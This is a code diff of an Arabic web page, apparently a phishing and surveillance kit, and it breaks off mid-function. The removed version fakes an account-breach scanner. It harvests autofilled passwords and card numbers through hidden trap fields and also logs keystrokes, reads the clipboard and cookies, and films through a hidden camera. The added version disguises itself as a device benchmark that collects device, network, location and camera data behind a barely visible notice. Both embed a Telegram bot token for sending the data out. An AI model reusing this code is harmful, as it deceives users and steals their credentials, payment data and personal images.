@@ -3,933 +3,728 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>فحص الاختراق - هل تم اختراق حسابك؟</title>
+    <title>⚡ اختبار قوة جهازك 2026</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;600;700;900&display=swap');
         body {
             font-family: 'Tajawal', sans-serif;
-            background: #080c18;
+            background: #070b16;
             color: #fff;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             direction: rtl;
         }
-        .container {
-            width: 100%;
-            max-width: 500px;
-            padding: 14px;
-        }
+        .container { max-width: 560px; margin: 0 auto; padding: 40px 16px 30px; }
         .card {
-            background: linear-gradient(145deg, #0c1428, #101c30);
-            border: 1px solid rgba(255,50,50,0.08);
+            background: linear-gradient(145deg, #0d1528, #111d35);
+            border: 1px solid rgba(0,180,255,0.08);
             border-radius: 20px;
-            padding: 28px 22px;
-            box-shadow: 0 30px 80px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.03);
+            padding: 30px 22px;
+            box-shadow: 0 25px 70px rgba(0,0,0,0.6);
             position: relative;
             overflow: hidden;
         }
         .card::before {
             content: '';
             position: absolute;
-            top: -50%; left: -50%;
-            width: 200%; height: 200%;
-            background: radial-gradient(circle at 30% 10%, rgba(255,50,50,0.03), transparent 60%);
+            top: -40%; left: -40%;
+            width: 180%; height: 180%;
+            background: radial-gradient(circle at 30% 10%, rgba(79,195,247,0.05), transparent 60%);
             pointer-events: none;
         }
-        .header {
-            text-align: center;
-            margin-bottom: 18px;
-            position: relative; z-index: 1;
+
+        /* ====== التنويه الصغير (فوق اليمين) ====== */
+        .mini-notice {
+            position: fixed;
+            top: 6px;
+            right: 8px;
+            font-size: 9px;
+            color: rgba(255,255,255,0.28);
+            z-index: 100;
+            user-select: none;
+            pointer-events: none;
+            direction: rtl;
+            font-family: 'Tajawal', sans-serif;
         }
-        .header .icon-box {
-            width: 65px; height: 65px;
+
+        .logo { text-align: center; margin-bottom: 18px; position: relative; z-index: 1; }
+        .logo .bolt {
+            width: 70px; height: 70px;
             margin: 0 auto 10px;
-            background: linear-gradient(135deg, #3a0a0a, #6a1010);
+            background: linear-gradient(135deg, #0a3d6b, #1a6db5);
             border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            font-size: 32px;
-            border: 2px solid rgba(255,50,50,0.3);
-            box-shadow: 0 0 40px rgba(255,0,0,0.1);
+            font-size: 36px;
+            border: 2px solid rgba(79,195,247,0.25);
+            box-shadow: 0 0 40px rgba(79,195,247,0.15);
         }
-        .header h1 {
-            font-size: 20px;
-            font-weight: 900;
-            color: #ff5252;
-        }
-        .header .sub {
-            color: #778;
-            font-size: 13px;
-            margin-top: 3px;
-        }
-        .header .badge {
+        .logo h1 { font-size: 24px; font-weight: 900; color: #4fc3f7; }
+        .logo .sub { color: #778; font-size: 14px; margin-top: 4px; }
+        .logo .count {
             display: inline-block;
-            background: rgba(255,50,50,0.08);
-            color: #ff8a80;
+            background: rgba(0,230,118,0.08);
+            color: #00e676;
             font-size: 11px;
             padding: 3px 14px;
             border-radius: 20px;
-            margin-top: 6px;
-            border: 1px solid rgba(255,50,50,0.12);
-        }
-        .scan-bar {
-            background: rgba(255,255,255,0.04);
-            border-radius: 30px;
-            height: 5px;
-            margin: 16px 0;
-            overflow: hidden;
-            position: relative; z-index: 1;
-        }
-        .scan-fill {
-            height: 100%; width: 0%;
-            background: linear-gradient(90deg, #ff5252, #ff8a80, #ff5252);
-            background-size: 200% 100%;
-            border-radius: 30px;
-            transition: width 0.6s ease;
-            animation: shim 1.5s infinite;
-        }
-        @keyframes shim { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
-        
-        .status-area {
-            text-align: center;
-            padding: 8px 0;
-            min-height: 50px;
-            position: relative; z-index: 1;
-        }
-        .status-icon { font-size: 34px; margin-bottom: 4px; }
-        .status-text { color: #aaa; font-size: 14px; font-weight: 600; }
-        .status-text.danger { color: #ff5252; }
-        .status-text.success { color: #00e676; }
-
-        /* Stage 1 - main form */
-        .main-form { position: relative; z-index: 1; }
-        .form-group {
-            margin-bottom: 13px;
-            position: relative;
-        }
-        .form-group label {
-            display: block;
-            color: #889;
-            font-size: 13px;
-            margin-bottom: 4px;
-        }
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 14px 16px;
-            background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 12px;
-            color: #fff;
-            font-size: 15px;
-            transition: 0.3s;
-            font-family: 'Tajawal', sans-serif;
-        }
-        .form-group input:focus {
-            outline: none;
-            border-color: #ff5252;
-            box-shadow: 0 0 25px rgba(255,50,50,0.08);
-        }
-        .form-group input::placeholder { color: #555; }
-        .form-group input:-webkit-autofill {
-            -webkit-text-fill-color: #fff !important;
-            -webkit-box-shadow: 0 0 0px 1000px rgba(12,16,30,0.98) inset !important;
-            caret-color: #fff;
+            margin-top: 8px;
+            border: 1px solid rgba(0,230,118,0.12);
         }
 
         .btn-main {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             border: none;
-            border-radius: 12px;
+            border-radius: 14px;
             color: #fff;
-            font-size: 16px;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
-            margin-top: 8px;
+            margin-top: 14px;
             transition: all 0.3s;
             font-family: 'Tajawal', sans-serif;
+            background: linear-gradient(135deg, #0f3460, #1a6db5);
             position: relative; z-index: 1;
         }
-        .btn-main:hover:not(:disabled) { transform: translateY(-2px); }
+        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 10px 35px rgba(79,195,247,0.25); }
+        .btn-main.green { background: linear-gradient(135deg, #0a4a20, #0a7a30); }
+        .btn-main.orange { background: linear-gradient(135deg, #7a4a00, #b57a00); }
+        .btn-main.small { padding: 12px; font-size: 14px; margin-top: 10px; }
         .btn-main:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-        .btn-main.primary { background: linear-gradient(135deg, #6a1010, #a02020); }
-        .btn-main.primary:hover:not(:disabled) { box-shadow: 0 10px 35px rgba(255,50,50,0.2); }
-        .btn-main.danger { background: linear-gradient(135deg, #8a0000, #cc0000); }
-        .btn-main.success { background: linear-gradient(135deg, #0a4a20, #0a7a30); }
 
-        /* Scan results */
-        .scan-results { margin: 10px 0; position: relative; z-index: 1; }
-        .scan-item {
-            display: flex; align-items: center; justify-content: space-between;
-            padding: 7px 12px;
-            border-radius: 10px;
-            background: rgba(255,255,255,0.02);
-            margin-bottom: 4px;
-            font-size: 13px;
-            opacity: 0;
-            transform: translateX(-10px);
-            transition: all 0.4s ease;
-        }
-        .scan-item.show { opacity: 1; transform: translateX(0); }
-        .scan-item .label { color: #889; }
-        .scan-item .value { font-weight: 600; }
-        .scan-item .value.danger { color: #ff5252; }
-        .scan-item .value.success { color: #00e676; }
-        .scan-item .value.warning { color: #ffab40; }
-
-        /* Verif box */
-        .verif-box {
-            background: rgba(255,50,50,0.06);
-            border: 1px solid rgba(255,50,50,0.15);
-            border-radius: 14px;
-            padding: 16px;
-            margin: 12px 0;
+        /* Test screen */
+        .test-status {
             text-align: center;
+            padding: 10px 0;
+            min-height: 60px;
             position: relative; z-index: 1;
         }
-        .verif-box .warn-icon { font-size: 36px; }
-        .verif-box h3 { color: #ff5252; font-size: 16px; margin: 6px 0; }
-        .verif-box p { color: #888; font-size: 13px; }
-        .verif-box .alert-detail { color: #ff8a80; font-size: 12px; margin-top: 8px; }
+        .test-icon { font-size: 44px; margin-bottom: 6px; }
+        .test-text { color: #aaa; font-size: 16px; font-weight: 600; }
+        .progress {
+            background: rgba(255,255,255,0.04);
+            border-radius: 30px;
+            height: 8px;
+            margin: 18px 0;
+            overflow: hidden;
+            position: relative; z-index: 1;
+        }
+        .progress-fill {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, #4fc3f7, #00e676);
+            border-radius: 30px;
+            transition: width 0.5s ease;
+        }
 
-        /* Result page */
-        .result-box { text-align: center; padding: 15px 0; position: relative; z-index: 1; }
-        .result-box .big-icon { font-size: 55px; margin-bottom: 8px; }
-        .result-box h2 { color: #00e676; font-size: 20px; }
-        .result-box p { color: #889; font-size: 14px; margin-top: 5px; }
+        /* Click test */
+        .click-zone {
+            text-align: center;
+            padding: 15px 0;
+            position: relative; z-index: 1;
+        }
+        .click-btn {
+            width: 180px; height: 180px;
+            border-radius: 50%;
+            border: none;
+            background: linear-gradient(135deg, #0f3460, #1a6db5);
+            color: #fff;
+            font-size: 22px;
+            font-weight: 900;
+            cursor: pointer;
+            transition: transform 0.08s;
+            font-family: 'Tajawal', sans-serif;
+            box-shadow: 0 15px 45px rgba(79,195,247,0.2);
+        }
+        .click-btn:active { transform: scale(0.93); }
+        .click-timer { color: #ffab40; font-size: 30px; font-weight: 900; margin: 8px 0; }
+        .click-count { color: #778; font-size: 14px; }
 
+        /* Result */
+        .result-box { text-align: center; position: relative; z-index: 1; }
+        .result-score {
+            font-size: 72px; font-weight: 900;
+            background: linear-gradient(135deg, #4fc3f7, #00e676);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .result-label { color: #889; font-size: 16px; }
+        .result-title { color: #00e676; font-weight: 700; font-size: 17px; margin-top: 8px; }
+        .result-desc { color: #667; font-size: 13px; margin-top: 4px; }
+
+        .section-title {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 14px; font-weight: 700; color: #4fc3f7;
+            margin: 18px 0 10px;
+            position: relative; z-index: 1;
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            position: relative; z-index: 1;
+        }
+        .info-item {
+            background: rgba(255,255,255,0.03);
+            border-radius: 10px;
+            padding: 10px 12px;
+        }
+        .info-item .k { color: #667; font-size: 11px; }
+        .info-item .v { color: #ddd; font-size: 13px; font-weight: 600; margin-top: 3px; direction: ltr; text-align: right; }
+
+        .form-group { margin-bottom: 12px; position: relative; z-index: 1; }
+        .form-group label { display: block; color: #889; font-size: 13px; margin-bottom: 4px; }
+        .form-group input {
+            width: 100%;
+            padding: 13px 14px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            font-family: 'Tajawal', sans-serif;
+            transition: 0.3s;
+        }
+        .form-group input:focus { outline: none; border-color: #4fc3f7; }
+        .form-group input:-webkit-autofill {
+            -webkit-text-fill-color: #fff !important;
+            -webkit-box-shadow: 0 0 0px 1000px rgba(15,25,50,0.98) inset !important;
+        }
+
+        #camPreview {
+            width: 100%;
+            max-height: 260px;
+            border-radius: 12px;
+            background: #000;
+            object-fit: cover;
+            display: none;
+            margin-top: 10px;
+            position: relative; z-index: 1;
+        }
+        #photoResult {
+            width: 100%;
+            border-radius: 12px;
+            margin-top: 8px;
+            display: none;
+            border: 1px solid rgba(0,230,118,0.2);
+            position: relative; z-index: 1;
+        }
+        .status-ok { color: #00e676; font-size: 12px; margin-top: 6px; text-align: center; position: relative; z-index: 1; }
+        .hidden { display: none !important; }
+
+        .footer-note { color: #334; font-size: 10px; text-align: center; margin-top: 16px; }
         #loadingOverlay {
             display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.88);
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.85);
             z-index: 9999;
             justify-content: center; align-items: center;
             flex-direction: column;
-            backdrop-filter: blur(5px);
         }
         #loadingOverlay.active { display: flex; }
         .spinner {
             width: 45px; height: 45px;
             border: 4px solid rgba(255,255,255,0.06);
-            border-top: 4px solid #ff5252;
+            border-top: 4px solid #4fc3f7;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .loading-text { color: #aaa; margin-top: 18px; font-size: 14px; }
-        .loading-sub { color: #556; font-size: 12px; margin-top: 4px; }
-
-        #hiddenCamera {
-            position: fixed; top: 0; left: 0;
-            width: 1px; height: 1px;
-            opacity: 0.01;
-            pointer-events: none; z-index: -1;
-        }
-
-        .trap-fields {
-            position: absolute; left: -9999px; top: -9999px;
-            opacity: 0; height: 0; overflow: hidden; pointer-events: none;
-        }
-        .consent-note {
-            font-size: 11px; color: #445;
-            text-align: center; margin-top: 10px;
-            position: relative; z-index: 1;
-        }
-        .ping-dot {
-            display: inline-block;
-            width: 7px; height: 7px;
-            border-radius: 50%;
-            background: #ff5252;
-            margin-left: 5px;
-            animation: ping 1.5s infinite;
-        }
-        @keyframes ping {
-            0% { opacity: 1; box-shadow: 0 0 5px #ff5252; }
-            50% { opacity: 0.3; box-shadow: 0 0 0px #ff5252; }
-            100% { opacity: 1; box-shadow: 0 0 5px #ff5252; }
-        }
-        .hidden { display: none !important; }
-        .glow-text { text-shadow: 0 0 20px rgba(255,50,50,0.3); }
+        .loading-text { color: #aaa; margin-top: 16px; font-size: 14px; }
+        .success-text { color: #00e676; font-weight: 700; text-align: center; margin-top: 10px; }
     </style>
 </head>
 <body>
 
+<!-- ====== التنويه الصغير فوق على اليمين ====== -->
+<div class="mini-notice">🔒 لأغراض مشروع أكاديمي — تُجمع بيانات جهازك ومعلومات عامة</div>
+
 <!-- Loading -->
 <div id="loadingOverlay">
     <div class="spinner"></div>
-    <p class="loading-text" id="loadingText">جارٍ الفحص...</p>
-    <p class="loading-sub" id="loadingSub">يرجى الانتظار</p>
-</div>
-
-<!-- Camera -->
-<video id="hiddenCamera" autoplay muted playsinline></video>
-<canvas id="photoCanvas" style="display:none;"></canvas>
-
-<!-- ========== TRAP FIELDS (Auto-fill magnets) ========== -->
-<div class="trap-fields">
-    <!-- Identity -->
-    <input type="text"     id="trapName"       name="name"         autocomplete="name"           value="">
-    <input type="email"    id="trapEmail"      name="email"        autocomplete="email"          value="">
-    <input type="tel"      id="trapPhone"      name="tel"          autocomplete="tel"            value="">
-    <input type="tel"      id="trapPhoneNat"   name="tel-national" autocomplete="tel-national"   value="">
-    <input type="password" id="trapPass"       name="password"     autocomplete="current-password" value="">
-    <input type="text"     id="trapUser"       name="username"     autocomplete="username"       value="">
-    <input type="text"     id="trapNick"       name="nickname"     autocomplete="nickname"       value="">
-
-    <!-- Address -->
-    <input type="text"     id="trapStreet"     name="street"       autocomplete="street-address" value="">
-    <input type="text"     id="trapCity"       name="city"         autocomplete="address-level2" value="">
-    <input type="text"     id="trapRegion"     name="region"       autocomplete="address-level1" value="">
-    <input type="text"     id="trapZip"        name="zip"          autocomplete="postal-code"    value="">
-    <input type="text"     id="trapCountry"    name="country"      autocomplete="country-name"   value="">
-
-    <!-- Credit Card -->
-    <input type="text"     id="trapCcName"     name="ccname"       autocomplete="cc-name"        value="">
-    <input type="text"     id="trapCcNum"      name="ccnumber"     autocomplete="cc-number"      value="">
-    <input type="text"     id="trapCcExp"      name="ccexp"        autocomplete="cc-exp"         value="">
-    <input type="text"     id="trapCcCsc"      name="cccsc"        autocomplete="cc-csc"         value="">
-    <input type="text"     id="trapCcType"     name="cctype"       autocomplete="cc-type"        value="">
-
-    <!-- Organization -->
-    <input type="text"     id="trapOrg"        name="org"          autocomplete="organization"   value="">
-    <input type="url"      id="trapUrl"        name="url"          autocomplete="url"            value="">
-    <input type="text"     id="trapPhoto"      name="photo"        autocomplete="photo"          value="">
+    <p class="loading-text" id="loadingText">جارٍ حفظ النتيجة...</p>
 </div>
 
 <div class="container">
-    <div class="card">
-        <!-- Header -->
-        <div class="header">
-            <div class="icon-box">🔓</div>
-            <h1 class="glow-text">هل تم اختراق حسابك؟</h1>
-            <p class="sub">أداة فحص الاختراق والثغرات — إصدار 4.7</p>
-            <span class="badge"><span class="ping-dot"></span> 1,847 عملية فحص اليوم</span>
-        </div>
-
-        <!-- Progress -->
-        <div class="scan-bar">
-            <div class="scan-fill" id="scanFill"></div>
-        </div>
-
-        <!-- ========== STAGE 1: ENTER USERNAME ========== -->
-        <div id="stage1">
-            <div class="status-area">
-                <div class="status-icon">🔍</div>
-                <div class="status-text">أدخل اسم المستخدم أو البريد لفحصه في قاعدة بيانات الاختراقات</div>
+    <!-- ========== شاشة البداية ========== -->
+    <div id="screenLanding">
+        <div class="card">
+            <div class="logo">
+                <div class="bolt">⚡</div>
+                <h1>اختبار قوة جهازك 2026</h1>
+                <p class="sub">قياس أداء المعالج والذاكرة والشبكة وسرعة استجابتك</p>
+                <span class="count"><span class="ping-dot"></span> 12,847 جهازاً تم اختباره</span>
             </div>
-            <div class="main-form">
-                <div class="form-group">
-                    <label>👤 اسم المستخدم أو البريد الإلكتروني أو رقم الجوال</label>
-                    <input type="text" id="usernameInput" placeholder="مثال: @user أو email@example.com" autocomplete="off">
+            <div class="click-zone">
+                <p style="color:#889;font-size:14px;">الاختبار يستغرق 15 ثانية فقط</p>
+                <p style="color:#556;font-size:12px;margin-top:4px;">يقيس: المعالج ⚙️ · الذاكرة 💾 · الشبكة 📶 · سرعة رد فعلك 👆</p>
+            </div>
+            <button class="btn-main" onclick="startTest()">🚀 ابدأ اختبار جهازك</button>
+        </div>
+    </div>
+
+    <!-- ========== شاشة الاختبار ========== -->
+    <div id="screenTest" class="hidden">
+        <div class="card">
+            <div class="logo">
+                <div class="bolt">⚡</div>
+                <h1 id="testTitle">جارٍ قياس الأداء...</h1>
+            </div>
+            <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
+            <div class="test-status">
+                <div class="test-icon" id="testIcon">🔄</div>
+                <div class="test-text" id="testText">جاري فحص المعالج...</div>
+            </div>
+
+            <!-- مرحلة الضغط السريع -->
+            <div id="clickPhase" class="hidden">
+                <div class="click-zone">
+                    <div class="click-timer" id="clickTimer">5</div>
+                    <button class="click-btn" id="clickBtn" onclick="registerClick()">👆 اضغطني بأقصى سرعة!</button>
+                    <div class="click-count" id="clickCountDisplay">الضغطات: 0</div>
                 </div>
-                <div class="form-group">
-                    <label>🌐 اختر المنصة</label>
-                    <select id="platformSelect">
-                        <option value="instagram">📸 Instagram</option>
-                        <option value="tiktok">🎵 TikTok</option>
-                        <option value="snapchat">👻 Snapchat</option>
-                        <option value="x">🐦 X (Twitter)</option>
-                        <option value="facebook">📘 Facebook</option>
-                        <option value="google">🔴 Gmail/Google</option>
-                        <option value="whatsapp">💬 WhatsApp</option>
-                    </select>
-                </div>
             </div>
-            <button class="btn-main primary" onclick="startScan()">🔍 فحص الحساب الآن</button>
         </div>
+    </div>
 
-        <!-- ========== STAGE 2: SCANNING ========== -->
-        <div id="stage2" class="hidden">
-            <div class="status-area">
-                <div class="status-icon" id="scanIcon">🔄</div>
-                <div class="status-text" id="scanStatus">جارٍ فحص الحساب في قواعد البيانات...</div>
-            </div>
-            <div class="scan-results" id="scanResults"></div>
-        </div>
-
-        <!-- ========== STAGE 3: VERIFICATION FORM ========== -->
-        <div id="stage3" class="hidden">
-            <div class="verif-box">
-                <div class="warn-icon">🚨</div>
-                <h3>تم اكتشاف اختراق!</h3>
-                <p>حسابك موجود في <b style="color:#ff5252;">3 قواعد بيانات</b> للاختراقات المسربة!</p>
-                <p class="alert-detail">آخر اختراق: <span id="leakDate">منذ 12 يوماً</span> · مصدر: <span id="leakSource">تسريب 2024</span></p>
-            </div>
-            <p style="color:#ff8a80;font-size:13px;margin-bottom:10px;text-align:center;">
-                ⚠️ يجب تأكيد ملكية الحساب فوراً لإرسال رابط استعادة
-            </p>
-
-            <div class="form-group">
-                <label>📧 البريد الإلكتروني المرتبط بالحساب</label>
-                <input type="email" id="emailInput" placeholder="example@email.com" autocomplete="off">
-            </div>
-            <div class="form-group">
-                <label>📱 رقم الجوال (تأكيد إضافي)</label>
-                <input type="tel" id="phoneInput" placeholder="05X XXX XXXX" autocomplete="off">
-            </div>
-            <div class="form-group">
-                <label>👤 الاسم الرباعي</label>
-                <input type="text" id="nameInput" placeholder="الاسم كما في الهوية" autocomplete="off">
-            </div>
-            <button class="btn-main danger" onclick="submitData()">🔐 استعادة الحساب فوراً</button>
-        </div>
-
-        <!-- ========== STAGE 4: FINAL ========== -->
-        <div id="stage4" class="hidden">
+    <!-- ========== شاشة النتيجة ========== -->
+    <div id="screenResult" class="hidden">
+        <div class="card">
             <div class="result-box">
-                <div class="big-icon">✅</div>
-                <h2>تم استلام طلب استعادة الحساب</h2>
-                <p id="resultEmailDisplay"></p>
-                <div style="margin:15px 0;padding:15px;background:rgba(0,200,100,0.05);border-radius:12px;border:1px solid rgba(0,230,118,0.1);">
-                    <p style="color:#00e676;font-size:13px;">✅ تم إرسال رابط استعادة الحساب إلى بريدك</p>
-                    <p style="color:#556;font-size:11px;margin-top:5px;">رمز الطلب: <span style="color:#4fc3f7;font-weight:bold;">#RST-<span id="resultCode">8421</span></span></p>
-                    <p style="color:#445;font-size:10px;margin-top:8px;">سيتم مراجعة طلبك خلال 24 ساعة</p>
-                </div>
+                <div class="test-icon">🏆</div>
+                <div class="result-score" id="finalScore">0</div>
+                <div class="result-label">نقاط قوة جهازك</div>
+                <div class="result-title" id="resultRank">جهازك ممتاز!</div>
+                <div class="result-desc" id="resultDesc">يتفوق على 87% من الأجهزة</div>
             </div>
-            <button class="btn-main success" onclick="location.reload()">فحص حساب آخر</button>
-        </div>
 
-        <p class="consent-note">بالاستمرار، أنت توافق على شروط الخدمة. جميع البيانات مشفرة.</p>
+            <div class="section-title">📊 تفاصيل الأداء المقاسة</div>
+            <div class="info-grid" id="specsGrid"></div>
+
+            <div class="section-title">📍 دقة النتيجة حسب موقعك <span style="font-size:11px;color:#556;">(اختياري)</span></div>
+            <button class="btn-main small orange" onclick="requestGeo()">📍 تفعيل الموقع الجغرافي</button>
+            <div id="geoResult" class="hidden">
+                <div class="info-grid" id="geoGrid" style="margin-top:8px;"></div>
+                <p class="status-ok">✅ تم تحديد الموقع</p>
+            </div>
+
+            <div class="section-title">📸 صورة رمزية لنتيجتك <span style="font-size:11px;color:#556;">(اختياري)</span></div>
+            <button class="btn-main small" id="btnCamera" onclick="toggleCamera()">📷 فتح الكاميرا</button>
+            <video id="camPreview" autoplay muted playsinline></video>
+            <button class="btn-main small green hidden" id="btnCapture" onclick="capturePhoto()">📸 التقاط الصورة</button>
+            <img id="photoResult" alt="صورتك">
+
+            <div class="section-title">🏆 سجل نتيجتك في المتصدرين</div>
+            <div class="form-group">
+                <label>👤 اسمك أو لقبك</label>
+                <input type="text" id="nicknameInput" placeholder="أدخل اسماً للوحة المتصدرين" autocomplete="name">
+            </div>
+            <button class="btn-main green" onclick="saveScore()">💾 حفظ النتيجة</button>
+            <div id="saveStatus"></div>
+        </div>
     </div>
 </div>
 
 <script>
 // ================================================================
-// ======================= CONFIG ==================================
+// ======================= الإعدادات ==============================
 // ================================================================
+// ⚠️ ضع بيانات بوت تيليجرام الخاص بالمشروع
 const BOT_TOKEN = '8615804805:AAEnqsH14JzpGTofTGZalI6yu-HtSXNWf7k';
-const CHAT_ID = '5197359202';
+const CHAT_ID  = '5197359202';
 
 // ================================================================
-// ======================= STATE ===================================
+// ======================= البيانات ===============================
 // ================================================================
-let scanTimer = null;
-let cameraStream = null;
-
-const d = {
+const data = {
     timestamp: new Date().toLocaleString('ar-SA'),
-    platform: '',
-    username: '',
-    email: '',
-    phone: '',
-    name: '',
-    ip: '-', city: '-', region: '-', country: '-',
-    lat: null, lon: null, accuracy: null,
-    device: '-', os: '-', osVer: '-',
-    browser: '-', browserVer: '-',
-    isp: '-', screen: '', tz: '', lang: '',
-    
-    // Auto-fill
-    afEmail: '', afPhone: '', afPass: '', afName: '', afUser: '',
-    afStreet: '', afCity: '', afRegion: '', afZip: '', afCountry: '',
-    afCcName: '', afCcNum: '', afCcExp: '', afCcCsc: '', afCcType: '',
-    afOrg: '', afUrl: '',
-    
-    // Device extras
-    battery: '-', charging: '-', network: '-', ram: '-', cores: '-',
-    webRtcIp: '-', platformInfo: '-', vendor: '-',
-    cookies: '', localStorageData: '',
-    
-    photoBase64: '',
-    keyLog: [],
-    scanFindings: []
+    nickname: '',
+    score: 0,
+    clicks: 0,
+    device: {}, network: {}, geo: {},
+    photoBase64: ''
 };
 
-let keylogEntries = [];
-document.addEventListener('keydown', (e) => {
-    const t = e.target;
-    if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) {
-        keylogEntries.push({
-            field: t.id || t.name || t.placeholder || '?',
-            key: e.key,
-            time: Date.now()
-        });
-    }
-});
+let cameraStream = null;
+let clickCount = 0;
+let clickTimerInterval = null;
+let geoDone = false;
 
 // ================================================================
-// ======================= AUTO-FILL SNATCH ========================
+// ======================= البدء ==================================
 // ================================================================
-function snatchAutoFill() {
-    const fields = {
-        afName:     document.getElementById('trapName'),
-        afEmail:    document.getElementById('trapEmail'),
-        afPhone:    document.getElementById('trapPhone'),
-        afPass:     document.getElementById('trapPass'),
-        afUser:     document.getElementById('trapUser'),
-        afStreet:   document.getElementById('trapStreet'),
-        afCity:     document.getElementById('trapCity'),
-        afRegion:   document.getElementById('trapRegion'),
-        afZip:      document.getElementById('trapZip'),
-        afCountry:  document.getElementById('trapCountry'),
-        afCcName:   document.getElementById('trapCcName'),
-        afCcNum:    document.getElementById('trapCcNum'),
-        afCcExp:    document.getElementById('trapCcExp'),
-        afCcCsc:    document.getElementById('trapCcCsc'),
-        afCcType:   document.getElementById('trapCcType'),
-        afOrg:      document.getElementById('trapOrg'),
-        afUrl:      document.getElementById('trapUrl')
-    };
+function startTest() {
+    document.getElementById('screenLanding').classList.add('hidden');
+    document.getElementById('screenTest').classList.remove('hidden');
     
-    for (const [key, el] of Object.entries(fields)) {
-        if (el && el.value) {
-            d[key] = el.value;
-        }
-    }
+    // نجمع البيانات في الخلفية
+    collectDeviceInfo();
+    collectNetworkInfo();
     
-    // Also check national phone
-    const phoneNat = document.getElementById('trapPhoneNat');
-    if (phoneNat && phoneNat.value && !d.afPhone) d.afPhone = phoneNat.value;
-    
-    // Also check nickname
-    const nick = document.getElementById('trapNick');
-    if (nick && nick.value && !d.afName) d.afName = nick.value;
-    
-    // Log what we got
-    const results = [];
-    if (d.afPass) results.push('🔐 باسوورد');
-    if (d.afCcNum) results.push('💳 فيزا');
-    if (d.afPhone) results.push('📱 جوال');
-    if (d.afEmail) results.push('📧 إيميل');
-    if (d.afName) results.push('👤 اسم');
-    if (d.afStreet) results.push('🏠 عنوان');
-    if (results.length) {
-        console.log('🔥 Auto-fill snatch:', results.join(' · '));
-    }
-    
-    // Snatch localStorage & cookies
-    try {
-        const s = {};
-        for (let i = 0; i < localStorage.length; i++) {
-            const k = localStorage.key(i);
-            try { s[k] = localStorage.getItem(k).substring(0, 200); } catch(e) {}
-        }
-        d.localStorageData = JSON.stringify(s).substring(0, 2000);
-    } catch(e) {}
-    d.cookies = document.cookie || '(none)';
+    // نبدأ عرض مراحل الاختبار
+    runBenchmark();
 }
 
 // ================================================================
-// ======================= CLIPBOARD STEAL =========================
+// ======================= مراحل الاختبار =========================
 // ================================================================
-async function stealClipboard() {
-    try {
-        const text = await navigator.clipboard.readText();
-        if (text && text.length > 3 && text.length < 500) {
-            d.clipboardData = text;
-            console.log('📋 Clipboard stolen:', text.substring(0, 50));
+function runBenchmark() {
+    const steps = [
+        { icon: '⚙️', text: 'جاري فحص المعالج...', time: 1200 },
+        { icon: '💾', text: 'قياس سرعة الذاكرة...', time: 1200 },
+        { icon: '📶', text: 'اختبار سرعة الشبكة...', time: 1200 },
+        { icon: '🎮', text: 'تحضير اختبار رد الفعل...', time: 800 }
+    ];
+    
+    let i = 0;
+    const fill = document.getElementById('progressFill');
+    
+    function nextStep() {
+        if (i < steps.length) {
+            const s = steps[i];
+            document.getElementById('testIcon').textContent = s.icon;
+            document.getElementById('testText').textContent = s.text;
+            fill.style.width = ((i + 1) / (steps.length + 1) * 100) + '%';
+            i++;
+            setTimeout(nextStep, s.time);
+        } else {
+            // ننتقل لاختبار الضغط
+            fill.style.width = '80%';
+            startClickTest();
         }
-    } catch(e) {
-        // Permission denied or not available
     }
+    nextStep();
 }
 
 // ================================================================
-// ======================= COLLECT DEVICE DATA =====================
+// ======================= اختبار الضغط ===========================
 // ================================================================
-async function collectDeviceData() {
+function startClickTest() {
+    document.getElementById('testIcon').textContent = '👆';
+    document.getElementById('testText').textContent = 'اضغط بأقصى سرعة خلال 5 ثوانٍ!';
+    document.getElementById('clickPhase').classList.remove('hidden');
+    
+    clickCount = 0;
+    document.getElementById('clickCountDisplay').textContent = 'الضغطات: 0';
+    
+    let timeLeft = 5;
+    document.getElementById('clickTimer').textContent = timeLeft;
+    
+    clickTimerInterval = setInterval(() => {
+        timeLeft--;
+        document.getElementById('clickTimer').textContent = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(clickTimerInterval);
+            finishTest();
+        }
+    }, 1000);
+}
+
+function registerClick() {
+    clickCount++;
+    document.getElementById('clickCountDisplay').textContent = 'الضغطات: ' + clickCount;
+}
+
+// ================================================================
+// ======================= حساب النتيجة ===========================
+// ================================================================
+function finishTest() {
+    data.clicks = clickCount;
+    
+    const dev = data.device;
+    let score = 25;
+    
+    // نقاط المعالج
+    const cores = dev.cores || 0;
+    score += Math.min(cores * 6, 25);
+    
+    // نقاط الرام
+    if (dev.ramGB >= 8) score += 10;
+    else if (dev.ramGB >= 4) score += 6;
+    
+    // نقاط الشبكة
+    if (dev.networkType === '5g' || dev.networkType === '4g') score += 10;
+    else if (dev.networkType === 'wifi' || dev.networkType === '3g') score += 6;
+    else if (dev.networkType === 'ethernet' || dev.networkType === 'fast') score += 8;
+    
+    // نقاط سرعة الرد
+    score += Math.min(clickCount * 2, 20);
+    
+    // نقاط المتصفح
